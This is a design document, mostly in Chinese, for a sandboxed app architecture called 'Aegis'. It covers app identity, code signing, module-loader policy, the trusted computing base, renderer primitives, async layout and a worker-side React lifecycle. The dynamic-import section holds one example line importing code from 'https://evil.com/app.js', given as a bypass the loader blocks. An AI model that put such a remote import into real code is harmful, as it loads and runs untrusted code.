# 04. Renderer and React Lifecycle

[返回技能索引](../../.agents/skills/aegis-design-index/SKILL.md)

包含应用身份、签名、动态导入、渲染器、可信计算基、UI Primitive、布局、Ref 与 React 生命周期。

---

# 26. Application Identity

每一个 Application 有唯一：

```text
App ID
Version
Publisher
Package Hash
Permissions
```

例如：

```text
com.example.todo
```

所有资源均绑定 App Identity。

---

# 27. Code Signing

生产环境支持：

```text
Developer
 ↓
Build
 ↓
Sign
 ↓
Package
 ↓
Store
 ↓
Host Verification
```

Host 验证：

```text
Signature
Hash
Publisher
Version
Manifest
```

---

# 28. Dynamic Import

不允许应用绕过 Package Security：

```js
import("https://evil.com/app.js")
```

动态模块加载必须经过：

```text
Aegis Module Loader
 ↓
Origin Policy
 ↓
Package Policy
 ↓
Signature Policy
 ↓
Allow / Deny
```

---

# 29. Main Renderer

Main Renderer 是 Trusted Computing Base 的核心。

职责只有：

```text
Protocol Decoder
Node Store
Mutation Applier
Event Dispatcher
```

它不应该：

```text
执行 Application JS
运行 React
处理业务逻辑
```

---

# 30. Trusted Computing Base

Aegis 应尽可能缩小 TCB：

```text
             Trusted Host
                  │
      ┌───────────┼───────────┐
      │           │           │
 Protocol     Capability   Resource
 Validator     Manager      Manager
      │
      ▼
 Main Renderer
```

而：

```text
React
Application
UI Library
State Library
```

都不属于 TCB。

---

# 31. Renderer Architecture

Aegis Protocol 不应该绑定 DOM。

```text
                  Aegis Protocol
                        │
          ┌─────────────┼─────────────┐
          ▼             ▼             ▼
     DOM Renderer   MiniApp       Native Renderer
                       Renderer
```

因此同一应用理论上可以：

```text
Web
MiniApp
Desktop
Native
```

运行。

---

# 32. UI Primitive

Aegis 推荐定义语义化 Primitive：

```text
View
Text
Image
Button
Input
ScrollView
List
Modal
```

而不是直接依赖：

```text
div
span
button
```

例如：

```jsx
<View>
  <Text>Hello</Text>
</View>
```

DOM Renderer：

```text
View → div
Text → span
```

MiniApp Renderer：

```text
View → native view
Text → native text
```

Native Renderer：

```text
View → NativeView
Text → NativeText
```

---

# 33. Layout

Worker 无法直接访问真实 Layout。

因此定义：

```ts
measure(node): Promise<Rect>
```

Worker：

```js
const rect = await measure(ref.current)
```

Main：

```text
measure
 ↓
Native Layout
 ↓
Rect
 ↓
Worker
```

Layout API 默认异步。

---

# 34. Ref

Worker 中：

```js
const ref = useRef()
```

不返回：

```text
HTMLElement
```

而返回：

```ts
{
  nodeId: NodeId
}
```

因此：

```text
ref
 ↓
logical node
 ↓
Capability / Protocol
```

而不是：

```text
ref
 ↓
DOM
```

---

# 35. React Lifecycle

React 生命周期完全运行在 Worker：

```text
mount
 ↓
render
 ↓
reconcile
 ↓
commit
 ↓
UI Protocol
 ↓
Main
```

`useEffect`：

```text
Worker
```

而不是：

```text
Main
```

---
